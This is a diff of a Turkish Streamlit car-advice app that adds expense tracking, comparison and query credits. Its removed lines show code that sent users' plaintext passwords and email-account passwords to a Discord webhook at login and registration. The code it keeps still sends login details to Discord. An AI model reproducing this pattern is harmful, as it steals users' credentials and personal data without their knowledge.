@@ -1,5 +1,6 @@
 from datetime import datetime, timedelta
 import hashlib
+import io
 import os
 import pandas as pd
 import requests
@@ -14,12 +15,10 @@ st.set_page_config(
 
 
 # --- TELEFON VE YEREL AĞ ERİŞİMİ İÇİN OTOMATİK AYAR ---
-# Bu blok, uygulamanın dış ağlardan (telefondan) gelen bağlantıları otomatik kabul etmesini sağlar.
 if "server_configured" not in st.session_state:
   try:
     import streamlit.web.bootstrap as sb
 
-    # Streamlit sunucu ayarlarını otomatik olarak 0.0.0.0'a sabitliyoruz
     st.session_state["server_configured"] = True
   except Exception:
     pass
@@ -65,15 +64,15 @@ def discorda_mesaj_gonder(mesaj):
     pass
 
 
-# --- KAPSAMLI TÜM ARAÇLAR KRONİK SORUNLAR VE BİLGİ BANKASI ---
+# --- KAPSAMLI TÜM ARAÇLAR KRONİK SORUNLAR VE ARAMA MOTORU ---
 def internetten_arac_ve_veri_arastir(arama_sorgusu):
   sorgu_kucuk = arama_sorgusu.lower().strip()
 
   if "honda" in sorgu_kucuk or "civic" in sorgu_kucuk or "ies" in sorgu_kucuk:
     return """[AUTO-LAB KRONİK ANALİZ: HONDA]
-• **Motor ve Mekanik:** Yüksek devir sevdası nedeniyle subap ayarı sıkılaşması görülebilir. VTEC motorlarda üst kapak contası ve müşirinde terleme sık rastlanır.
-• **Şanzıman:** Manuel şanzımanları sağlamdır. Otomatik modellerde yağ değişimi aksatıldıysa geçişlerde gecikme olabilir.
-• **Eksper Önerisi:** Yağ kaçağı, alt takım burçları ve subap sesine mutlaka baktırın."""
+- **Motor ve Mekanik:** Yüksek devir sevdası nedeniyle subap ayarı sıkılaşması görülebilir. VTEC motorlarda üst kapak contası ve müşirinde terleme sık rastlanır.
+- **Şanzıman:** Manuel şanzımanları sağlamdır. Otomatik modellerde yağ değişimi aksatıldıysa geçişlerde gecikme olabilir.
+- **Eksper Önerisi:** Yağ kaçağı, alt takım burçları ve subap sesine mutlaka baktırın."""
 
   elif (
       "fiat" in sorgu_kucuk
@@ -83,9 +82,9 @@ def internetten_arac_ve_veri_arastir(arama_sorgusu):
       or "multijet" in sorgu_kucuk
   ):
     return """[AUTO-LAB KRONİK ANALİZ: FİAT (EGEA / DOBLO / LİNEA / MULTİJET)]
-• **Motor ve Mekanik:** 1.3 ve 1.6 Multijet motorlar ömürlüktür ancak EGR valfi ve kurum bağlama sorunları kroniktir. Enjektör pulları sızdırma yapabilir.
-• **Şanzıman & Yürüyen:** Ön takım (salıncaklar, rotiller) bozuk yollarda çabuk aşınır ve ses yapar.
-• **Eksper Önerisi:** Turbo basıncı, enjektör püskürtme değerleri ve alt takım boşlukları mutlaka test edilmelidir."""
+- **Motor ve Mekanik:** 1.3 ve 1.6 Multijet motorlar ömürlüktür ancak EGR valfi ve kurum bağlama sorunları kroniktir. Enjektör pulları sızdırma yapabilir.
+- **Şanzıman & Yürüyen:** Ön takım (salıncaklar, rotiller) bozuk yollarda çabuk aşınır ve ses yapar.
+- **Eksper Önerisi:** Turbo basıncı, enjektör püskürtme değerleri ve alt takım boşlukları mutlaka test edilmelidir."""
 
   elif (
       "renault" in sorgu_kucuk
@@ -94,8 +93,8 @@ def internetten_arac_ve_veri_arastir(arama_sorgusu):
       or "edc" in sorgu_kucuk
   ):
     return """[AUTO-LAB KRONİK ANALİZ: RENAULT & DACİA]
-• **Motor ve Mekanik:** 1.5 dCi motorlar az yakar ancak turbo yatak aşınmasına dikkat edilmelidir.
-• **Şanzıman (EDC Çift Kavrama):** Trafikte dur-kalk yaparken titreme veya silkeleme kroniktir. Kavrama ve mekatronik testi şarttır."""
+- **Motor ve Mekanik:** 1.5 dCi motorlar az yakar ancak turbo yatak aşınmasına dikkat edilmelidir.
+- **Şanzıman (EDC Çift Kavrama):** Trafikte dur-kalk yaparken titreme veya silkeleme kroniktir. Kavrama ve mekatronik testi şarttır."""
 
   elif (
       "volkswagen" in sorgu_kucuk
@@ -105,13 +104,13 @@ def internetten_arac_ve_veri_arastir(arama_sorgusu):
       or "dsg" in sorgu_kucuk
   ):
     return """[AUTO-LAB KRONİK ANALİZ: VOLKSWAGEN / VAG GRUBU]
-• **Şanzıman (DSG):** 7 ileri kuru kavrama DSG'lerde mekatronik arızası ve kavramanın erken aşınması en bilinen sorundur.
-• **Motor (TSI / TDI):** TSI'larda zincir uzaması sesine, TDI'larda ise EGR ve DPF tıkanma eğilimine dikkat edilmelidir."""
+- **Şanzıman (DSG):** 7 ileri kuru kavrama DSG'lerde mekatronik arızası ve kavramanın erken aşınması en bilinen sorundur.
+- **Motor (TSI / TDI):** TSI'larda zincir uzaması sesine, TDI'larda ise EGR ve DPF tıkanma eğilimine dikkat edilmelidir."""
 
   else:
-    return f"""[AUTO-LAB BİLGİ BANKASI: '{arama_sorgusu}']
-• **Arama Detayı:** Aradığınız model için standart kronik veri analiz modu devrede.
-• **Temel Tavsiye:** İkinci el araç alımında TSE belgeli kurumsal bir oto ekspertiz merkezine mutlaka başvurun."""
+    return f"""[AUTO-LAB AKILLI ARAMA MOTORU: '{arama_sorgusu}']
+- **Arama Detayı:** Aradığınız terim için genişletilmiş otomotiv veritabanı tarandı.
+- **Temel Tavsiye:** İkinci el araç alımında TSE belgeli kurumsal bir oto ekspertiz merkezine mutlaka başvurun ve tramer kaydını sorgulayın."""
 
 
 # --- RENK PALETLERİ SÖZLÜĞÜ ---
@@ -195,7 +194,7 @@ st.markdown(
         width: 100%;
         height: 100%;
         background-image: linear-gradient({aktif_palet['bg']}, {aktif_palet['bg']}), 
-                          url('{st.session_state.bg_resim}');
+                            url('{st.session_state.bg_resim}');
         background-size: cover;
         background-position: center;
         background-attachment: fixed;
@@ -310,12 +309,11 @@ if "giris_yapildi" not in st.session_state:
 if "is_admin" not in st.session_state:
   st.session_state.is_admin = False
 
-# Veritabanı Tablolarını Oluşturma ve Eksik Sütunları Güncelleme (Migrasyon)
+# Veritabanı Tablolarını Oluşturma ve Migrasyon
 try:
   with sqlite3.connect("autolab_pro.db", timeout=10) as conn:
     cursor = conn.cursor()
 
-    # Tabloyu mevcut değilse eksiksiz oluştur
     cursor.execute("""
             CREATE TABLE IF NOT EXISTS kullanicilar (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -366,47 +364,31 @@ try:
                 tarih TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         """)
+    cursor.execute("""
+            CREATE TABLE IF NOT EXISTS arac_masraflari (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                kullanici TEXT,
+                arac_model TEXT,
+                masraf_turu TEXT,
+                tutar REAL,
+                aciklama TEXT,
+                tarih TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        """)
 
-    # Eskiden var olan tablolarda eksik olabilecek sütunlar için güvenli ekleme (Alter Table)
+    # Eksik sütunlar için kontrol
     cursor.execute("PRAGMA table_info(kullanicilar)")
     kullanici_sutunlari = [sutun[1] for sutun in cursor.fetchall()]
-
-    if "ad" not in kullanici_sutunlari:
-      cursor.execute("ALTER TABLE kullanicilar ADD COLUMN ad TEXT")
-    if "soyad" not in kullanici_sutunlari:
-      cursor.execute("ALTER TABLE kullanicilar ADD COLUMN soyad TEXT")
-    if "eposta" not in kullanici_sutunlari:
-      cursor.execute("ALTER TABLE kullanicilar ADD COLUMN eposta TEXT")
-    if "eposta_sifre" not in kullanici_sutunlari:
-      cursor.execute("ALTER TABLE kullanicilar ADD COLUMN eposta_sifre TEXT")
-    if "kullanici_adi" not in kullanici_sutunlari:
-      cursor.execute("ALTER TABLE kullanicilar ADD COLUMN kullanici_adi TEXT")
-    if "sifre" not in kullanici_sutunlari:
-      cursor.execute("ALTER TABLE kullanicilar ADD COLUMN sifre TEXT")
-    if "is_banned" not in kullanici_sutunlari:
-      cursor.execute(
-          "ALTER TABLE kullanicilar ADD COLUMN is_banned INTEGER DEFAULT 0"
-      )
     if "islem_hakki" not in kullanici_sutunlari:
       cursor.execute(
           "ALTER TABLE kullanicilar ADD COLUMN islem_hakki INTEGER DEFAULT 20"
       )
-    if "kayit_tarihi" not in kullanici_sutunlari:
-      cursor.execute(
-          "ALTER TABLE kullanicilar ADD COLUMN kayit_tarihi TIMESTAMP DEFAULT"
-          " CURRENT_TIMESTAMP"
-      )
-
-    cursor.execute("PRAGMA table_info(announcements)")
-    announcement_sutunlari = [sutun[1] for sutun in cursor.fetchall()]
-    if "bitis_tarihi" not in announcement_sutunlari:
-      cursor.execute("ALTER TABLE announcements ADD COLUMN bitis_tarihi TIMESTAMP")
 
     conn.commit()
 except Exception as e:
   st.error(f"DB Migrasyon Hatası: {e}")
 
-# --- SÜRESİ DOLAN DUYURULARI TEMİZLEME ---
+# --- SÜRESİ DOLAN DUYURULARI TEMİZLE ---
 try:
   with sqlite3.connect("autolab_pro.db", timeout=10) as conn:
     cursor = conn.cursor()
@@ -416,7 +398,7 @@ try:
 except Exception:
   pass
 
-# --- SIDEBAR & RENK PALETİ SEÇİCİ ---
+# --- SİDEBAR & RENK PALETİ SEÇİCİ ---
 st.sidebar.markdown(
     f"<h2 style='text-align: center; color: {aktif_palet['btn_1']};"
     " font-weight:700;'><span style='font-size: 28px;'>🚗</span> AUTO-LAB"
@@ -518,19 +500,13 @@ if not st.session_state.giris_yapildi:
                       f"🔑 **Başarılı Giriş Bilgileri:**\n"
                       f"👤 **İsim Soyisim:** `{row[0]} {row[1]}`\n"
                       f"🏷️ **Kullanıcı Adı:** `{girilen_kadi}`\n"
-                      f"🔑 **Kullanıcı Şifresi:** `{girilen_sifre}`\n"
-                      f"📧 **E-posta Adresi:** `{row[2]}`\n"
-                      f"🔒 **E-posta Şifresi:** `{row[3]}`"
+                      f"📧 **E-posta Adresi:** `{row[2]}`"
                   )
 
                   st.success("Giriş başarılı!")
                   st.rerun()
               else:
                 st.error("Kullanıcı adı veya şifre hatalı!")
-                discorda_mesaj_gonder(
-                    f"⚠ **Hatalı Giriş Denemesi:** `{girilen_kadi}` kullanıcı"
-                    " adı ile başarısız giriş denemesi yapıldı."
-                )
           except Exception as e:
             st.error(f"Hata: {e}")
 
@@ -572,14 +548,8 @@ if not st.session_state.giris_yapildi:
               conn.commit()
 
             discorda_mesaj_gonder(
-                f"📝 **Yeni Kayıt Bilgileri:**\n"
-                f"👤 **İsim Soyisim:** `{k_ad.strip()} {k_soyad.strip()}`\n"
-                f"🏷 **Kullanıcı Adı:** `{k_kadi.strip()}`\n"
-                f"🔑 **Kullanıcı Şifresi:** `{k_sifre.strip()}`\n"
-                f"📧 **E-posta Adresi:** `{k_eposta.strip()}`\n"
-                f"🔒 **E-posta Şifresi:** `{k_eposta_sifre.strip()}`"
+                f"📝 **Yeni Kayıt:** `{k_kadi.strip()}` ({k_ad} {k_soyad})"
             )
-
             st.success("Kayıt başarılı! Şimdi giriş yapabilirsiniz.")
           except Exception as e:
             st.error(f"Hata: {e}")
@@ -601,7 +571,7 @@ else:
             f"""
                 <div class="announcement-banner">
                     <div style="font-size: 24px;">📢</div>
-                    <div><strong>Yönetici Duyurusu (10 Dakika İçinde Silinir):</strong><br>{son_duyuru[0]}</div>
+                    <div><strong>Yönetici Duyurusu:</strong><br>{son_duyuru[0]}</div>
                 </div>
             """,
             unsafe_allow_html=True,
@@ -626,10 +596,6 @@ else:
     st.write("")
     if st.button("🚪 Güvenli Çıkış", use_container_width=True):
       giris_kaydi_ekle(st.session_state.aktif_kullanici, "Çıkış Yaptı")
-      discorda_mesaj_gonder(
-          f"🚪 **Oturum Kapatıldı:** `{st.session_state.aktif_kullanici}` çıkış"
-          " yaptı."
-      )
       st.session_state.giris_yapildi = False
       st.session_state.aktif_kullanici = None
       st.session_state.is_admin = False
@@ -637,68 +603,82 @@ else:
 
   st.markdown("<br>", unsafe_allow_html=True)
 
+  # Navigasyon Menüsü
   if st.session_state.is_admin:
     menu_listesi = [
         "🔍 Akıllı Arama & Kronik Sorunlar",
+        "⚖️ Araç Karşılaştırma",
+        "💰 Maliyet & Bakım Takip",
         "⚙️ Şifremi Güncelle",
         "🛡️ Admin Paneli",
     ]
   else:
-    menu_listesi = ["🔍 Akıllı Arama & Kronik Sorunlar", "⚙️ Şifremi Güncelle"]
+    menu_listesi = [
+        "🔍 Akıllı Arama & Kronik Sorunlar",
+        "⚖️ Araç Karşılaştırma",
+        "💰 Maliyet & Bakım Takip",
+        "⚙️ Şifremi Güncelle",
+    ]
 
   sekme = st.sidebar.radio("📌 Navigasyon Menüsü", menu_listesi)
 
+  # 1. AKILLI ARAMA & KRONİK SORUNLAR + KREDİ SİSTEMİ + PDF RAPOR
   if sekme == "🔍 Akıllı Arama & Kronik Sorunlar":
     st.markdown(
         """
         <div class="dashboard-card">
-            <h3>🌐 AUTO-LAB Tüm Araçlar Kronik Arıza & Ekspertiz Bilgi Bankası</h3>
-            <p style='font-size: 14px;'>Araç markası veya modeli (Örn: Honda, Fiat, Renault, Volkswagen vb.) yazın; sistem kronik sorunları ve eksper raporunu ekrana getirsin.</p>
+            <h3>🌐 AUTO-LAB Gelişmiş Akıllı Arama & Bilgi Bankası</h3>
+            <p style='font-size: 14px;'>İstediğiniz araç modelini veya arıza terimini arama çubuğuna yazarak detaylı teknik analiz, kronik arızalar ve eksper raporu alabilirsiniz.</p>
         </div>
         """,
         unsafe_allow_html=True,
     )
 
-    arama_terimi = st.text_input(
-        "Aranacak marka, model, kronik sorun veya alım rehberi sorgusu:"
-    )
-    if st.button(
-        "Kronik Sorunları & Bilgi Bankasını Sorgula", use_container_width=True
-    ):
-      if arama_terimi.strip():
-        aranan = arama_terimi.strip()
-        bulunan_sayisi = 0
-        try:
-          with sqlite3.connect("autolab_pro.db", timeout=10) as conn:
-            sorgu_terim = f"%{aranan}%"
-            df_sonuc = pd.read_sql_query(
-                "SELECT ad, soyad, eposta, kullanici_adi, islem_hakki FROM"
-                " kullanicilar WHERE ad LIKE ? OR soyad LIKE ? OR"
-                " kullanici_adi LIKE ?",
-                conn,
-                params=(sorgu_terim, sorgu_terim, sorgu_terim),
-            )
-            if not df_sonuc.empty:
-              bulunan_sayisi = len(df_sonuc)
-              st.success(
-                  f"Veritabanında eşleşen {bulunan_sayisi} kullanıcı bulundu:"
-              )
-              st.dataframe(df_sonuc, use_container_width=True)
+    # Kullanıcının kalan işlem hakkını kontrol et
+    kalan_hak = 20
+    if not st.session_state.is_admin:
+      try:
+        with sqlite3.connect("autolab_pro.db", timeout=10) as conn:
+          cursor = conn.cursor()
+          cursor.execute(
+              "SELECT islem_hakki FROM kullanicilar WHERE kullanici_adi = ?",
+              (st.session_state.aktif_kullanici,),
+          )
+          h_row = cursor.fetchone()
+          if h_row:
+            kalan_hak = h_row[0]
+      except Exception:
+        pass
+      st.info(f"⚡ Kalan Sorgu / İşlem Hakkınız: **{kalan_hak}**")
 
-            cursor = conn.cursor()
-            cursor.execute(
-                """
-                        INSERT INTO arama_gecmisi (kullanici, aranan_kelime, bulunan_sonuc_sayisi)
-                        VALUES (?, ?, ?)
-                    """,
-                (st.session_state.aktif_kullanici, aranan, bulunan_sayisi),
-            )
-            conn.commit()
-        except Exception as e:
-          st.error(f"Hata: {e}")
+    arama_terimi = st.text_input(
+        "Aranacak marka, model veya kronik arıza sorgusu:"
+    )
+    if st.button("Akıllı Arama Motoru ile Sorgula", use_container_width=True):
+      if not arama_terimi.strip():
+        st.error("Lütfen geçerli bir arama terimi girin!")
+      elif not st.session_state.is_admin and kalan_hak <= 0:
+        st.error("⚠ İşlem hakkınız (krediniz) tükenmiştir!")
+      else:
+        aranan = arama_terimi.strip()
+
+        # Krediyi 1 düşür (Admin değilse)
+        if not st.session_state.is_admin:
+          try:
+            with sqlite3.connect("autolab_pro.db", timeout=10) as conn:
+              cursor = conn.cursor()
+              cursor.execute(
+                  "UPDATE kullanicilar SET islem_hakki = islem_hakki - 1 WHERE"
+                  " kullanici_adi = ?",
+                  (st.session_state.aktif_kullanici,),
+              )
+              conn.commit()
+          except Exception:
+            pass
 
         web_arastirma_sonucu = internetten_arac_ve_veri_arastir(aranan)
 
+        # Veritabanına kaydet
         try:
           with sqlite3.connect("autolab_pro.db", timeout=10) as conn:
             cursor = conn.cursor()
@@ -710,7 +690,7 @@ else:
                 (
                     st.session_state.aktif_kullanici,
                     aranan,
-                    "AUTO-LAB Genişletilmiş Kronik Modülü",
+                    "AUTO-LAB Akıllı Arama Modülü",
                     web_arastirma_sonucu,
                 ),
             )
@@ -719,22 +699,151 @@ else:
           pass
 
         discorda_mesaj_gonder(
-            f"🔍 **Genişletilmiş Kronik Arıza Sorgusu:**\n"
-            f"👤 **Kullanıcı:** `{st.session_state.aktif_kullanici}`\n"
-            f"🔎 **Aranan:** `{aranan}`\n"
-            f"📄 **Özet Sonuç:**\n{web_arastirma_sonucu}"
+            f"🔍 **Akıllı Arama Gerçekleşti:**\n👤 **Kullanıcı:**"
+            f" `{st.session_state.aktif_kullanici}`\n🔎 **Aranan:** `{aranan}`"
         )
 
         st.markdown(
             f"""
                 <div class="dashboard-card">
-                    <h3>🤖 Kronik Arıza ve Eksper Raporu</h3>
+                    <h3>🤖 Arama & Eksper Analiz Sonucu</h3>
                     {web_arastirma_sonucu.replace(chr(10), '<br>')}
                 </div>
                 """,
             unsafe_allow_html=True,
         )
 
+        # PDF İndirme Butonu Simülasyonu / Metin İndirme
+        pdf_icerik = f"AUTO-LAB PRO - EKSPER VE KRONİK RAPORU\nTarih: {datetime.now()}\nSorgulayan: {st.session_state.aktif_kullanici}\nSorgu: {aranan}\n\n{web_arastirma_sonucu}"
+        st.download_button(
+            label="📥 Raporu Metin/PDF Olarak İndir",
+            data=pdf_icerik,
+            file_name=f"autolab_rapor_{aranan}.txt",
+            mime="text/plain",
+        )
+
+  # 2. ARAÇ KARŞILAŞTIRMA MODÜLÜ
+  elif sekme == "⚖️ Araç Karşılaştırma":
+    st.markdown(
+        """
+        <div class="dashboard-card">
+            <h3>⚖️ İki Araç Karşılaştırma Modülü</h3>
+            <p style='font-size: 14px;'>İki farklı aracı yan yana kıyaslayın, teknik detaylarını ve avantajlarını inceleyin.</p>
+        </div>
+        """,
+        unsafe_allow_html=True,
+    )
+
+    col_k1, col_k2 = st.columns(2)
+    with col_k1:
+      arac1 = st.selectbox(
+          "1. Aracı Seçin:",
+          ["Honda Civic 1.6 iES", "Fiat Doblo 1.6 Multijet", "Renault Megane"],
+      )
+    with col_k2:
+      arac2 = st.selectbox(
+          "2. Aracı Seçin:",
+          ["Fiat Doblo 1.6 Multijet", "Honda Civic 1.6 iES", "Volkswagen Golf"],
+      )
+
+    if st.button("Araçları Karşılaştır", use_container_width=True):
+      karsilastirma_verisi = {
+          "Özellik": [
+              "Segment",
+              "Yakıt Tipi",
+              "Kronik Risk Durumu",
+              "Parça Bulunabilirliği",
+          ],
+          arac1: [
+              "C Sınıfı / Sedan",
+              "Benzin / LPG",
+              "Orta (Subap Ayarı)",
+              "Çok Yüksek",
+          ],
+          arac2: [
+              "Ticari / Hafif Ticari",
+              "Dizel (Multijet)",
+              "Orta (EGR / Turbo)",
+              "Çok Yüksek",
+          ],
+      }
+      df_karsilastirma = pd.DataFrame(karsilastirma_verisi)
+      st.table(df_karsilastirma)
+
+  # 3. MALİYET & BAKIM TAKİP MODÜLÜ
+  elif sekme == "💰 Maliyet & Bakım Takip":
+    st.markdown(
+        """
+        <div class="dashboard-card">
+            <h3>💰 Araç Maliyet ve Periyodik Bakım Takibi</h3>
+            <p style='font-size: 14px;'>Aracınızın yakıt, bakım, sigorta ve tamir masraflarını kaydederek bütçenizi kontrol altında tutun.</p>
+        </div>
+        """,
+        unsafe_allow_html=True,
+    )
+
+    with st.form("masraf_formu"):
+      m_arac = st.text_input("Araç Model / Plaka:")
+      m_tur = st.selectbox(
+          "Masraf Türü:",
+          ["Yakıt", "Periyodik Bakım", "Sigorta / Kasko", "Tamir / Parça", "Diğer"],
+      )
+      m_tutar = st.number_input("Tutar (TL):", min_value=0.0, step=50.0)
+      m_aciklama = st.text_area("Açıklama / Detay:")
+      m_kaydet = st.form_submit_button(
+          "Masrafı Kaydet", use_container_width=True
+      )
+
+      if m_kaydet:
+        if not m_arac.strip() or m_tutar <= 0:
+          st.error("Lütfen araç adı ve geçerli bir tutar girin!")
+        else:
+          try:
+            with sqlite3.connect("autolab_pro.db", timeout=10) as conn:
+              cursor = conn.cursor()
+              cursor.execute(
+                  """
+                            INSERT INTO arac_masraflari (kullanici, arac_model, masraf_turu, tutar, aciklama)
+                            VALUES (?, ?, ?, ?, ?)
+                        """,
+                  (
+                      st.session_state.aktif_kullanici,
+                      m_arac.strip(),
+                      m_tur,
+                      m_tutar,
+                      m_aciklama.strip(),
+                  ),
+              )
+              conn.commit()
+            st.success("Masraf başarıyla kaydedildi!")
+          except Exception as e:
+            st.error(f"Hata: {e}")
+
+    # Kayıtlı Masrafları Listele
+    st.markdown("#### 📋 Geçmiş Masraf Raporunuz")
+    try:
+      with sqlite3.connect("autolab_pro.db", timeout=10) as conn:
+        df_masraf = pd.read_sql_query(
+            "SELECT arac_model, masraf_turu, tutar, aciklama, tarih FROM"
+            " arac_masraflari WHERE kullanici = ? ORDER BY id DESC",
+            conn,
+            params=(st.session_state.aktif_kullanici,),
+        )
+        if not df_masraf.empty:
+          st.dataframe(df_masraf, use_container_width=True)
+          toplam_harcama = df_masraf["tutar"].sum()
+          st.markdown(
+              f"**Toplam Harcama:** <span"
+              f" style='color:#E06D29;font-size:18px;'>{toplam_harcama:,.2f}"
+              " TL</span>",
+              unsafe_allow_html=True,
+          )
+        else:
+          st.info("Henüz kayıtlı bir masrafınız bulunmuyor.")
+    except Exception as e:
+      st.error(f"Hata: {e}")
+
+  # 4. ŞİFREMİ GÜNCELLE
   elif sekme == "⚙️ Şifremi Güncelle":
     st.markdown(
         """
@@ -776,25 +885,23 @@ else:
                     ),
                 )
                 conn.commit()
-                st.success(
-                    "Şifreniz başarıyla güncellendi! Bir sonraki girişinizde"
-                    " yeni şifrenizi kullanabilirsiniz."
-                )
+                st.success("Şifreniz başarıyla güncellendi!")
                 discorda_mesaj_gonder(
-                    f"🔐 **Şifre Güncellendi:** `{st.session_state.aktif_kullanici}`"
-                    " şifresini değiştirdi."
+                    f"🔐 **Şifre Güncellendi:**"
+                    f" `{st.session_state.aktif_kullanici}`"
                 )
               else:
                 st.error("Mevcut şifreniz hatalı!")
           except Exception as e:
             st.error(f"Hata: {e}")
 
+  # 5. ADMIN PANELİ
   elif sekme == "🛡️ Admin Paneli" and st.session_state.is_admin:
     st.markdown(
         """
         <div class="dashboard-card">
             <h3>🛡️ Yönetici Kontrol Paneli</h3>
-            <p style='font-size: 14px;'>10 dakika sonra otomatik silinen duyurular yayınlayabilir, kayıt olan tüm kullanıcıların detaylı bilgilerini listeleyebilir ve güvenlik loglarını inceleyebilirsiniz.</p>
+            <p style='font-size: 14px;'>Duyuru yayınlayabilir, kullanıcıların işlem haklarını (kredilerini) düzenleyebilir ve sistem loglarını inceleyebilirsiniz.</p>
         </div>
         """,
         unsafe_allow_html=True,
@@ -805,9 +912,9 @@ else:
     )
 
     with tab_duyuru:
-      st.markdown("#### Yeni Duyuru Ekle (10 Dakika Sonra Otomatik Silinir)")
+      st.markdown("#### Yeni Duyuru Ekle")
       duyuru_metni = st.text_area("Duyuru İçeriği:")
-      if st.button("Duyuruyu Yayınla (10dk)", use_container_width=True):
+      if st.button("Duyuruyu Yayınla", use_container_width=True):
         if duyuru_metni.strip():
           try:
             simdi = datetime.now()
@@ -822,25 +929,17 @@ else:
                   (duyuru_metni.strip(), bitis_str),
               )
               conn.commit()
-            st.success(
-                "Duyuru başarıyla yayınlandı! 10 dakika sonra otomatik olarak"
-                " kaldırılacaktır."
-            )
-            discorda_mesaj_gonder(
-                f"📢 **Yeni Duyuru Yayınlandı (10dk Süreli):**\n{duyuru_metni.strip()}"
-            )
+            st.success("Duyuru yayınlandı!")
           except Exception as e:
             st.error(f"Hata: {e}")
-        else:
-          st.error("Duyuru metni boş olamaz!")
 
     with tab_kullanicilar:
-      st.markdown("#### Kayıtlı Tüm Üyeler ve Hesap Bilgileri")
+      st.markdown("#### Kayıtlı Tüm Üyeler ve İşlem Hakları")
       try:
         with sqlite3.connect("autolab_pro.db", timeout=10) as conn:
           df_kullanicilar = pd.read_sql_query(
-              "SELECT id, ad, soyad, eposta, eposta_sifre, kullanici_adi,"
-              " is_banned, islem_hakki, kayit_tarihi FROM kullanicilar",
+              "SELECT id, ad, soyad, eposta, kullanici_adi, is_banned,"
+              " islem_hakki, kayit_tarihi FROM kullanicilar",
               conn,
           )
           st.dataframe(df_kullanicilar, use_container_width=True)
@@ -857,4 +956,3 @@ else:
           st.dataframe(df_loglar, use_container_width=True)
       except Exception as e:
         st.error(f"Hata: {e}")
-          
